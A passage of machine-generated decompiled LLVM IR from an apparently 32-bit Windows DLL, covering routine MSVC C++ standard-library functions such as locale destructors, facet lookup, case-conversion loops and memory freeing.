  %4 = xor i32 %3, %1, !insn.addr !120
  store i32 %4, i32* %stack_var_-24, align 4, !insn.addr !121
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !122
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !123
  %6 = inttoptr i32 %0 to i32*, !insn.addr !124
  %7 = call i32 @"?_Locinfo_dtor@_Locinfo@std@@SAXPAV12@@Z"(i32* %6), !insn.addr !124
  %8 = add i32 %0, 44, !insn.addr !125
  %9 = inttoptr i32 %8 to i32*, !insn.addr !125
  %10 = load i32, i32* %9, align 4, !insn.addr !125
  %11 = icmp eq i32 %10, 0, !insn.addr !126
  br i1 %11, label %dec_label_pc_1000140e, label %dec_label_pc_10001405, !insn.addr !127

dec_label_pc_10001405:                            ; preds = %dec_label_pc_100013d0
  %12 = call i32 @_free(), !insn.addr !128
  br label %dec_label_pc_1000140e, !insn.addr !129

dec_label_pc_1000140e:                            ; preds = %dec_label_pc_10001405, %dec_label_pc_100013d0
  store i32 0, i32* %9, align 4, !insn.addr !130
  %13 = add i32 %0, 36, !insn.addr !131
  %14 = inttoptr i32 %13 to i32*, !insn.addr !131
  %15 = load i32, i32* %14, align 4, !insn.addr !131
  %16 = icmp eq i32 %15, 0, !insn.addr !132
  br i1 %16, label %dec_label_pc_10001425, label %dec_label_pc_1000141c, !insn.addr !133

dec_label_pc_1000141c:                            ; preds = %dec_label_pc_1000140e
  %17 = call i32 @_free(), !insn.addr !134
  br label %dec_label_pc_10001425, !insn.addr !135

dec_label_pc_10001425:                            ; preds = %dec_label_pc_1000141c, %dec_label_pc_1000140e
  store i32 0, i32* %14, align 4, !insn.addr !136
  %18 = add i32 %0, 28, !insn.addr !137
  %19 = inttoptr i32 %18 to i32*, !insn.addr !137
  %20 = load i32, i32* %19, align 4, !insn.addr !137
  %21 = icmp eq i32 %20, 0, !insn.addr !138
  br i1 %21, label %dec_label_pc_1000143c, label %dec_label_pc_10001433, !insn.addr !139

dec_label_pc_10001433:                            ; preds = %dec_label_pc_10001425
  %22 = call i32 @_free(), !insn.addr !140
  br label %dec_label_pc_1000143c, !insn.addr !141

dec_label_pc_1000143c:                            ; preds = %dec_label_pc_10001433, %dec_label_pc_10001425
  %23 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !142
  store i32 0, i32* %19, align 4, !insn.addr !143
  %24 = add i32 %0, 20, !insn.addr !144
  %25 = inttoptr i32 %24 to i32*, !insn.addr !144
  %26 = load i32, i32* %25, align 4, !insn.addr !144
  %27 = icmp eq i32 %26, 0, !insn.addr !145
  br i1 %27, label %dec_label_pc_10001453, label %dec_label_pc_1000144a, !insn.addr !146

dec_label_pc_1000144a:                            ; preds = %dec_label_pc_1000143c
  %28 = add i32 %23, -4, !insn.addr !147
  %29 = inttoptr i32 %28 to i32*, !insn.addr !147
  store i32 %26, i32* %29, align 4, !insn.addr !147
  %30 = call i32 @_free(), !insn.addr !148
  br label %dec_label_pc_10001453, !insn.addr !149

dec_label_pc_10001453:                            ; preds = %dec_label_pc_1000144a, %dec_label_pc_1000143c
  store i32 0, i32* %25, align 4, !insn.addr !150
  %31 = add i32 %0, 12, !insn.addr !151
  %32 = inttoptr i32 %31 to i32*, !insn.addr !151
  %33 = load i32, i32* %32, align 4, !insn.addr !151
  %34 = icmp eq i32 %33, 0, !insn.addr !152
  br i1 %34, label %dec_label_pc_1000146a, label %dec_label_pc_10001461, !insn.addr !153

dec_label_pc_10001461:                            ; preds = %dec_label_pc_10001453
  %35 = add i32 %23, -4, !insn.addr !154
  %36 = inttoptr i32 %35 to i32*, !insn.addr !154
  store i32 %33, i32* %36, align 4, !insn.addr !154
  %37 = call i32 @_free(), !insn.addr !155
  br label %dec_label_pc_1000146a, !insn.addr !156

dec_label_pc_1000146a:                            ; preds = %dec_label_pc_10001461, %dec_label_pc_10001453
  store i32 0, i32* %32, align 4, !insn.addr !157
  %38 = add i32 %0, 4, !insn.addr !158
  %39 = inttoptr i32 %38 to i32*, !insn.addr !158
  %40 = load i32, i32* %39, align 4, !insn.addr !158
  %41 = icmp eq i32 %40, 0, !insn.addr !159
  br i1 %41, label %dec_label_pc_10001481, label %dec_label_pc_10001478, !insn.addr !160

dec_label_pc_10001478:                            ; preds = %dec_label_pc_1000146a
  %42 = add i32 %23, -4, !insn.addr !161
  %43 = inttoptr i32 %42 to i32*, !insn.addr !161
  store i32 %40, i32* %43, align 4, !insn.addr !161
  %44 = call i32 @_free(), !insn.addr !162
  br label %dec_label_pc_10001481, !insn.addr !163

dec_label_pc_10001481:                            ; preds = %dec_label_pc_10001478, %dec_label_pc_1000146a
  store i32 0, i32* %39, align 4, !insn.addr !164
  %45 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !165
  %46 = load i32, i32* %stack_var_-16, align 4, !insn.addr !166
  call void @__writefsdword(i32 0, i32 %46), !insn.addr !167
  ret i32 %45, !insn.addr !168
}

define i32 @function_100014a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100014a0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i128 @__decompiler_undefined_function_3()
  %2 = call i128 @__asm_xorps(i128 %1, i128 %1), !insn.addr !169
  %3 = add i32 %0, 4, !insn.addr !170
  %4 = inttoptr i32 %0 to i32*, !insn.addr !171
  store i32 ptrtoint (%vtable_1002c3b4_type* @global_var_1002c3b4 to i32), i32* %4, align 4, !insn.addr !171
  %5 = inttoptr i32 %3 to i64*, !insn.addr !172
  %6 = load i64, i64* %5, align 4, !insn.addr !172
  call void @__asm_movq.32(i64 %6, i128 %2), !insn.addr !172
  %7 = call i32 @___std_exception_copy(), !insn.addr !173
  store i32 ptrtoint (i32* @global_var_1002c3c0 to i32), i32* %4, align 4, !insn.addr !174
  ret i32 %0, !insn.addr !175
}

define i32 @function_100014e0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100014e0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !176
  %2 = icmp eq i8 %1, 0, !insn.addr !176
  %3 = inttoptr i32 %0 to i32*, !insn.addr !177
  store i32 ptrtoint (i32* @global_var_1002c3d8 to i32), i32* %3, align 4, !insn.addr !177
  br i1 %2, label %dec_label_pc_100014fd, label %dec_label_pc_100014f2, !insn.addr !178

dec_label_pc_100014f2:                            ; preds = %dec_label_pc_100014e0
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !179
  br label %dec_label_pc_100014fd, !insn.addr !180

dec_label_pc_100014fd:                            ; preds = %dec_label_pc_100014f2, %dec_label_pc_100014e0
  ret i32 %0, !insn.addr !181
}

define i32 @function_10001550() local_unnamed_addr {
dec_label_pc_10001550:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, 4, !insn.addr !182
  %3 = inttoptr i32 %2 to i32*, !insn.addr !182
  %4 = load i32, i32* %3, align 4, !insn.addr !182
  %5 = add i32 %4, 1, !insn.addr !182
  store i32 %5, i32* %3, align 4, !insn.addr !182
  ret i32 %1, !insn.addr !183
}

define i32 @function_10001560() local_unnamed_addr {
dec_label_pc_10001560:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !184
  %2 = inttoptr i32 %1 to i32*, !insn.addr !184
  %3 = load i32, i32* %2, align 4, !insn.addr !184
  %4 = add i32 %3, -1, !insn.addr !184
  %5 = icmp eq i32 %4, 0, !insn.addr !184
  store i32 %4, i32* %2, align 4, !insn.addr !184
  %6 = select i1 %5, i32 %0, i32 0, !insn.addr !185
  ret i32 %6, !insn.addr !186
}

define i32 @"??1locale@std@@QAE@XZ"() local_unnamed_addr {
dec_label_pc_10001580:
  %eax.0.reg2mem = alloca i32, !insn.addr !187
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !188
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !189
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !190
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !191
  %3 = add i32 %0, 4, !insn.addr !192
  %4 = inttoptr i32 %3 to i32*, !insn.addr !192
  %5 = load i32, i32* %4, align 4, !insn.addr !192
  %6 = icmp eq i32 %5, 0, !insn.addr !193
  store i32 %2, i32* %eax.0.reg2mem, !insn.addr !194
  br i1 %6, label %dec_label_pc_100015ba, label %dec_label_pc_100015a9, !insn.addr !194

dec_label_pc_100015a9:                            ; preds = %dec_label_pc_10001580
  %7 = inttoptr i32 %5 to i32*, !insn.addr !195
  %8 = load i32, i32* %7, align 4, !insn.addr !195
  store i32 %8, i32* %eax.0.reg2mem
  br label %dec_label_pc_100015ba

dec_label_pc_100015ba:                            ; preds = %dec_label_pc_100015a9, %dec_label_pc_10001580
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %9 = load i32, i32* %stack_var_-16, align 4, !insn.addr !196
  call void @__writefsdword(i32 0, i32 %9), !insn.addr !197
  ret i32 %eax.0.reload, !insn.addr !198
}

define i8* @"?c_str@locale@std@@QBEPBDXZ"() local_unnamed_addr {
dec_label_pc_100015d0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !199
  %2 = inttoptr i32 %1 to i32*, !insn.addr !199
  %3 = load i32, i32* %2, align 4, !insn.addr !199
  %4 = icmp eq i32 %3, 0, !insn.addr !200
  %5 = icmp eq i1 %4, false, !insn.addr !201
  br i1 %5, label %dec_label_pc_100015dd, label %dec_label_pc_100015d7, !insn.addr !201

dec_label_pc_100015d7:                            ; preds = %dec_label_pc_100015d0
  ret i8* bitcast (i8** @global_var_10038c04 to i8*), !insn.addr !202

dec_label_pc_100015dd:                            ; preds = %dec_label_pc_100015d0
  %6 = add i32 %3, 24, !insn.addr !203
  %7 = inttoptr i32 %6 to i32*, !insn.addr !203
  %8 = load i32, i32* %7, align 4, !insn.addr !203
  %9 = icmp eq i32 %8, 0, !insn.addr !204
  br i1 %9, label %dec_label_pc_100015e7, label %dec_label_pc_100015e4, !insn.addr !205

dec_label_pc_100015e4:                            ; preds = %dec_label_pc_100015dd
  %10 = inttoptr i32 %8 to i8*, !insn.addr !206
  ret i8* %10, !insn.addr !206

dec_label_pc_100015e7:                            ; preds = %dec_label_pc_100015dd
  %11 = add i32 %3, 28, !insn.addr !207
  %12 = inttoptr i32 %11 to i8*, !insn.addr !208
  ret i8* %12, !insn.addr !208
}

define i32* @"?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z"(i32* %result, i32 %arg2) local_unnamed_addr {
dec_label_pc_100015f0:
  %eax.1.reg2mem = alloca i32, !insn.addr !209
  %eax.0.reg2mem = alloca i32, !insn.addr !209
  %0 = ptrtoint i32* %result to i32
  %1 = add i32 %0, 4, !insn.addr !210
  %2 = inttoptr i32 %1 to i32*, !insn.addr !210
  %3 = load i32, i32* %2, align 4, !insn.addr !210
  %4 = add i32 %3, 12, !insn.addr !211
  %5 = inttoptr i32 %4 to i32*, !insn.addr !211
  %6 = load i32, i32* %5, align 4, !insn.addr !211
  %7 = icmp ugt i32 %6, %arg2, !insn.addr !211
  %8 = icmp eq i1 %7, false, !insn.addr !212
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !212
  br i1 %8, label %dec_label_pc_1000160d, label %dec_label_pc_100015ff, !insn.addr !212

dec_label_pc_100015ff:                            ; preds = %dec_label_pc_100015f0
  %9 = add i32 %3, 8, !insn.addr !213
  %10 = inttoptr i32 %9 to i32*, !insn.addr !213
  %11 = load i32, i32* %10, align 4, !insn.addr !213
  %12 = mul i32 %arg2, 4, !insn.addr !214
  %13 = add i32 %11, %12, !insn.addr !214
  %14 = inttoptr i32 %13 to i32*, !insn.addr !214
  %15 = load i32, i32* %14, align 4, !insn.addr !214
  %16 = icmp eq i32 %15, 0, !insn.addr !215
  %17 = icmp eq i1 %16, false, !insn.addr !216
  store i32 %15, i32* %eax.0.reg2mem, !insn.addr !216
  store i32 %15, i32* %eax.1.reg2mem, !insn.addr !216
  br i1 %17, label %dec_label_pc_1000162a, label %dec_label_pc_1000160d, !insn.addr !216

dec_label_pc_1000160d:                            ; preds = %dec_label_pc_100015f0, %dec_label_pc_100015ff
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = add i32 %3, 20, !insn.addr !217
  %19 = inttoptr i32 %18 to i8*, !insn.addr !217
  %20 = load i8, i8* %19, align 1, !insn.addr !217
  %21 = icmp eq i8 %20, 0, !insn.addr !217
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !218
  br i1 %21, label %dec_label_pc_1000162a, label %dec_label_pc_10001613, !insn.addr !218

dec_label_pc_10001613:                            ; preds = %dec_label_pc_1000160d
  %22 = call i32 @function_1000dad2(), !insn.addr !219
  %23 = add i32 %22, 12, !insn.addr !220
  %24 = inttoptr i32 %23 to i32*, !insn.addr !220
  %25 = load i32, i32* %24, align 4, !insn.addr !220
  %26 = icmp ugt i32 %25, %arg2, !insn.addr !220
  %27 = icmp eq i1 %26, false, !insn.addr !221
  store i32 0, i32* %eax.1.reg2mem, !insn.addr !221
  br i1 %27, label %dec_label_pc_1000162a, label %dec_label_pc_1000161d, !insn.addr !221

dec_label_pc_1000161d:                            ; preds = %dec_label_pc_10001613
  %28 = add i32 %22, 8, !insn.addr !222
  %29 = inttoptr i32 %28 to i32*, !insn.addr !222
  %30 = load i32, i32* %29, align 4, !insn.addr !222
  %31 = mul i32 %arg2, 4, !insn.addr !223
  %32 = add i32 %30, %31, !insn.addr !223
  %33 = inttoptr i32 %32 to i32*, !insn.addr !223
  %34 = load i32, i32* %33, align 4, !insn.addr !223
  %35 = inttoptr i32 %34 to i32*, !insn.addr !224
  ret i32* %35, !insn.addr !224

dec_label_pc_1000162a:                            ; preds = %dec_label_pc_10001613, %dec_label_pc_1000160d, %dec_label_pc_100015ff
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %36 = inttoptr i32 %eax.1.reload to i32*, !insn.addr !225
  ret i32* %36, !insn.addr !225
}

define i32 @function_10001630(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001630:
  %ecx.0.reg2mem = alloca i32, !insn.addr !226
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !227
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !228
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !229
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !230
  %2 = icmp eq i32 %arg2, 0, !insn.addr !231
  br i1 %2, label %dec_label_pc_100016e2, label %dec_label_pc_10001679, !insn.addr !232

dec_label_pc_10001679:                            ; preds = %dec_label_pc_10001630
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !233
  %4 = load i32, i32* %3, align 4, !insn.addr !233
  %5 = icmp eq i32 %4, 0, !insn.addr !233
  %6 = icmp eq i1 %5, false, !insn.addr !234
  br i1 %6, label %dec_label_pc_100016e2, label %dec_label_pc_1000167e, !insn.addr !234

dec_label_pc_1000167e:                            ; preds = %dec_label_pc_10001679
  %7 = call i32 @"??2@YAPAXI@Z"(i32 24), !insn.addr !235
  %8 = add i32 %arg3, 4, !insn.addr !236
  %9 = inttoptr i32 %8 to i32*, !insn.addr !236
  %10 = load i32, i32* %9, align 4, !insn.addr !236
  %11 = icmp eq i32 %10, 0, !insn.addr !237
  %12 = icmp eq i1 %11, false, !insn.addr !238
  store i32 ptrtoint (i8** @global_var_10038c04 to i32), i32* %ecx.0.reg2mem, !insn.addr !238
  br i1 %12, label %dec_label_pc_100016a5, label %dec_label_pc_100016af, !insn.addr !238

dec_label_pc_100016a5:                            ; preds = %dec_label_pc_1000167e
  %13 = add i32 %10, 24, !insn.addr !239
  %14 = inttoptr i32 %13 to i32*, !insn.addr !239
  %15 = load i32, i32* %14, align 4, !insn.addr !239
  %16 = icmp eq i32 %15, 0, !insn.addr !240
  %17 = icmp eq i1 %16, false, !insn.addr !241
  %18 = add i32 %10, 28
  %spec.select = select i1 %17, i32 %15, i32 %18
  store i32 %spec.select, i32* %ecx.0.reg2mem
  br label %dec_label_pc_100016af

dec_label_pc_100016af:                            ; preds = %dec_label_pc_100016a5, %dec_label_pc_1000167e
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %19 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !242
  %20 = call i32 @"??0_Locinfo@std@@QAE@PBD@Z"(i32* nonnull %stack_var_-108, i8* %19), !insn.addr !243
  %21 = add i32 %7, 4, !insn.addr !244
  %22 = inttoptr i32 %21 to i32*, !insn.addr !244
  store i32 0, i32* %22, align 4, !insn.addr !244
  %23 = inttoptr i32 %7 to i32*, !insn.addr !245
  store i32 ptrtoint (i32* @global_var_1002c3e8 to i32), i32* %23, align 4, !insn.addr !245
  %24 = call i32 @__Getctype(i32* nonnull %stack_var_-56), !insn.addr !246
  %25 = inttoptr i32 %24 to i128*, !insn.addr !247
  %26 = load i128, i128* %25, align 4, !insn.addr !247
  %27 = call i128 @__asm_movups.36(i128 %26), !insn.addr !247
  %28 = add i32 %7, 8, !insn.addr !248
  %29 = inttoptr i32 %28 to i128*, !insn.addr !248
  %30 = load i128, i128* %29, align 4, !insn.addr !248
  call void @__asm_movups(i128 %30, i128 %27), !insn.addr !248
  store i32 %7, i32* %3, align 4, !insn.addr !249
  %31 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !250
  br label %dec_label_pc_100016e2, !insn.addr !250

dec_label_pc_100016e2:                            ; preds = %dec_label_pc_100016af, %dec_label_pc_10001679, %dec_label_pc_10001630
  %32 = load i32, i32* %stack_var_-28, align 4, !insn.addr !251
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !252
  ret i32 2, !insn.addr !253
}

define i32 @function_10001700(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001700:
  %0 = call i32 @__Tolower(), !insn.addr !254
  ret i32 %0, !insn.addr !255
}

define i32 @function_10001720(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001720:
  %esi.1.reg2mem = alloca i32, !insn.addr !256
  %edi.0.reg2mem = alloca i32, !insn.addr !256
  %esi.0.reg2mem = alloca i32, !insn.addr !256
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !257
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !258
  br i1 %4, label %dec_label_pc_1000175a, label %dec_label_pc_1000173c, !insn.addr !258

dec_label_pc_1000173c:                            ; preds = %dec_label_pc_10001720
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !259
  %6 = add i32 %0, 8, !insn.addr !260
  %7 = add i32 %5, -4, !insn.addr !261
  %8 = inttoptr i32 %7 to i32*, !insn.addr !261
  %9 = add i32 %5, -8, !insn.addr !262
  %10 = inttoptr i32 %9 to i32*, !insn.addr !262
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !263
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !263
  br label %dec_label_pc_10001742, !insn.addr !263

dec_label_pc_10001742:                            ; preds = %dec_label_pc_10001742, %dec_label_pc_1000173c
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !261
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !264
  %12 = load i8, i8* %11, align 1, !insn.addr !264
  %13 = zext i8 %12 to i32, !insn.addr !264
  store i32 %13, i32* %10, align 4, !insn.addr !262
  %14 = call i32 @__Tolower(), !insn.addr !265
  %15 = trunc i32 %14 to i8, !insn.addr !266
  store i8 %15, i8* %11, align 1, !insn.addr !266
  %16 = add i32 %edi.0.reload, 1, !insn.addr !267
  %17 = add i32 %esi.0.reload, 1, !insn.addr !268
  %18 = icmp eq i32 %16, %3, !insn.addr !269
  %19 = icmp eq i1 %18, false, !insn.addr !270
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !270
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !270
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !270
  br i1 %19, label %dec_label_pc_10001742, label %dec_label_pc_1000175a, !insn.addr !270

dec_label_pc_1000175a:                            ; preds = %dec_label_pc_10001742, %dec_label_pc_10001720
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !271
}

define i32 @function_10001770(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001770:
  %0 = call i32 @__Toupper(), !insn.addr !272
  ret i32 %0, !insn.addr !273
}

define i32 @function_10001790(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001790:
  %esi.1.reg2mem = alloca i32, !insn.addr !274
  %edi.0.reg2mem = alloca i32, !insn.addr !274
  %esi.0.reg2mem = alloca i32, !insn.addr !274
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = icmp ult i32 %arg2, %arg1
  %2 = select i1 %1, i32 %arg1, i32 %arg2
  %3 = sub i32 %2, %arg1
  %4 = icmp eq i32 %3, 0, !insn.addr !275
  store i32 %arg1, i32* %esi.1.reg2mem, !insn.addr !276
  br i1 %4, label %dec_label_pc_100017ca, label %dec_label_pc_100017ac, !insn.addr !276

dec_label_pc_100017ac:                            ; preds = %dec_label_pc_10001790
  %5 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !277
  %6 = add i32 %0, 8, !insn.addr !278
  %7 = add i32 %5, -4, !insn.addr !279
  %8 = inttoptr i32 %7 to i32*, !insn.addr !279
  %9 = add i32 %5, -8, !insn.addr !280
  %10 = inttoptr i32 %9 to i32*, !insn.addr !280
  store i32 %arg1, i32* %esi.0.reg2mem, !insn.addr !281
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !281
  br label %dec_label_pc_100017b2, !insn.addr !281

dec_label_pc_100017b2:                            ; preds = %dec_label_pc_100017b2, %dec_label_pc_100017ac
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  store i32 %6, i32* %8, align 4, !insn.addr !279
  %11 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !282
  %12 = load i8, i8* %11, align 1, !insn.addr !282
  %13 = zext i8 %12 to i32, !insn.addr !282
  store i32 %13, i32* %10, align 4, !insn.addr !280
  %14 = call i32 @__Toupper(), !insn.addr !283
  %15 = trunc i32 %14 to i8, !insn.addr !284
  store i8 %15, i8* %11, align 1, !insn.addr !284
  %16 = add i32 %edi.0.reload, 1, !insn.addr !285
  %17 = add i32 %esi.0.reload, 1, !insn.addr !286
  %18 = icmp eq i32 %16, %3, !insn.addr !287
  %19 = icmp eq i1 %18, false, !insn.addr !288
  store i32 %17, i32* %esi.0.reg2mem, !insn.addr !288
  store i32 %16, i32* %edi.0.reg2mem, !insn.addr !288
  store i32 %17, i32* %esi.1.reg2mem, !insn.addr !288
  br i1 %19, label %dec_label_pc_100017b2, label %dec_label_pc_100017ca, !insn.addr !288

dec_label_pc_100017ca:                            ; preds = %dec_label_pc_100017b2, %dec_label_pc_10001790
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  ret i32 %esi.1.reload, !insn.addr !289
}

define i32 @function_100017e0(i8 %arg1) local_unnamed_addr {
dec_label_pc_100017e0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !290
  %2 = and i32 %0, -256, !insn.addr !290
  %3 = or i32 %2, %1, !insn.addr !290
  ret i32 %3, !insn.addr !291
}

define i32 @function_100017f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100017f0:
  %0 = call i32 @_memcpy.12(), !insn.addr !292
  ret i32 %arg2, !insn.addr !293
}

define i32 @function_10001810(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001810:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = zext i8 %arg1 to i32, !insn.addr !294
  %2 = and i32 %0, -256, !insn.addr !294
  %3 = or i32 %2, %1, !insn.addr !294
  ret i32 %3, !insn.addr !295
}

define i32 @function_10001820(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10001820:
  %0 = call i32 @_memcpy.12(), !insn.addr !296
  ret i32 %arg2, !insn.addr !297
}

define i32 @function_10001840(i8 %arg1) local_unnamed_addr {
dec_label_pc_10001840:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 16, !insn.addr !298
  %2 = inttoptr i32 %1 to i32*, !insn.addr !298
  %3 = load i32, i32* %2, align 4, !insn.addr !298
  %4 = inttoptr i32 %0 to i32*, !insn.addr !299
  store i32 ptrtoint (i32* @global_var_1002c3e8 to i32), i32* %4, align 4, !insn.addr !299
  %5 = icmp slt i32 %3, 1
  br i1 %5, label %dec_label_pc_1000185d, label %dec_label_pc_10001853, !insn.addr !300

dec_label_pc_10001853:                            ; preds = %dec_label_pc_10001840
  %6 = call i32 @_free(), !insn.addr !301
  br label %dec_label_pc_1000186a, !insn.addr !302

dec_label_pc_1000185d:                            ; preds = %dec_label_pc_10001840
  %7 = icmp ne i32 %3, 0, !insn.addr !303
  %8 = icmp eq i1 %7, false, !insn.addr !304
  br i1 %8, label %dec_label_pc_1000186a, label %dec_label_pc_1000185f, !insn.addr !304

dec_label_pc_1000185f:                            ; preds = %dec_label_pc_1000185d
  %9 = call i32 @function_1000eb26(), !insn.addr !305
  br label %dec_label_pc_1000186a, !insn.addr !305

dec_label_pc_1000186a:                            ; preds = %dec_label_pc_10001853, %dec_label_pc_1000185f, %dec_label_pc_1000185d
  %10 = call i32 @_free(), !insn.addr !306
  store i32 ptrtoint (i32* @global_var_1002c3d8 to i32), i32* %4, align 4, !insn.addr !307
  %11 = and i8 %arg1, 1, !insn.addr !308
  %12 = icmp eq i8 %11, 0, !insn.addr !308
  br i1 %12, label %dec_label_pc_1000188c, label %dec_label_pc_10001881, !insn.addr !309

dec_label_pc_10001881:                            ; preds = %dec_label_pc_1000186a
  call void @"??3@YAXPAXI@Z"(i32* nonnull %4, i32 ptrtoint (i32* @4 to i32)), !insn.addr !310
  br label %dec_label_pc_1000188c, !insn.addr !311

dec_label_pc_1000188c:                            ; preds = %dec_label_pc_10001881, %dec_label_pc_1000186a
  ret i32 %0, !insn.addr !312
}

define i32 @function_100018a0(i8 %arg1) {
dec_label_pc_100018a0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = and i8 %arg1, 1, !insn.addr !313
  %2 = icmp eq i8 %1, 0, !insn.addr !313
  %3 = inttoptr i32 %0 to i32*, !insn.addr !314
  store i32 ptrtoint (i32* @global_var_1002c418 to i32), i32* %3, align 4, !insn.addr !314
  br i1 %2, label %dec_label_pc_100018bd, label %dec_label_pc_100018b2, !insn.addr !315

dec_label_pc_100018b2:                            ; preds = %dec_label_pc_100018a0
  call void @"??3@YAXPAXI@Z"(i32* %3, i32 ptrtoint (i32* @4 to i32)), !insn.addr !316
  br label %dec_label_pc_100018bd, !insn.addr !317

dec_label_pc_100018bd:                            ; preds = %dec_label_pc_100018b2, %dec_label_pc_100018a0
  ret i32 %0, !insn.addr !318
}

define i32 @function_100018d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100018d0:
  ret i32 %arg1, !insn.addr !319
}

define i32 @function_10001900(i32 %arg1, i32 %arg2) {
dec_label_pc_10001900:
  %0 = inttoptr i32 %arg1 to i32*, !insn.addr !320
  store i32 %arg2, i32* %0, align 4, !insn.addr !320
  %1 = add i32 %arg1, 4, !insn.addr !321
  %2 = inttoptr i32 %1 to i32*, !insn.addr !321
  ret i32 %arg1, !insn.addr !322
}

define i32 @function_10001920(i32 %arg1, i32 %arg2) {
dec_label_pc_10001920:
  %eax.0.reg2mem = alloca i32, !insn.addr !323
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 4, !insn.addr !324
  %2 = inttoptr i32 %1 to i32*, !insn.addr !324
  %3 = load i32, i32* %2, align 4, !insn.addr !324
  %4 = add i32 %arg2, 4, !insn.addr !325
  %5 = inttoptr i32 %4 to i32*, !insn.addr !325
  %6 = load i32, i32* %5, align 4, !insn.addr !325
  %7 = add i32 %3, 4, !insn.addr !326
  %8 = inttoptr i32 %7 to i32*, !insn.addr !326
  %9 = load i32, i32* %8, align 4, !insn.addr !326
  %10 = add i32 %6, 4, !insn.addr !327
  %11 = inttoptr i32 %10 to i32*, !insn.addr !327
  %12 = load i32, i32* %11, align 4, !insn.addr !327
  %13 = icmp eq i32 %9, %12, !insn.addr !327
  %14 = icmp eq i1 %13, false, !insn.addr !328
  br i1 %14, label %dec_label_pc_10001953, label %dec_label_pc_10001944, !insn.addr !328

dec_label_pc_10001944:                            ; preds = %dec_label_pc_10001920
  %15 = inttoptr i32 %arg2 to i32*, !insn.addr !329
  %16 = load i32, i32* %15, align 4, !insn.addr !329
  %17 = icmp eq i32 %9, %16, !insn.addr !329
  %18 = icmp eq i1 %17, false, !insn.addr !330
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !330
  br i1 %18, label %dec_label_pc_10001953, label %dec_label_pc_1000194a, !insn.addr !330

dec_label_pc_1000194a:                            ; preds = %dec_label_pc_10001944
  %19 = and i32 %9, -256, !insn.addr !331
  %20 = or i32 %19, 1, !insn.addr !331
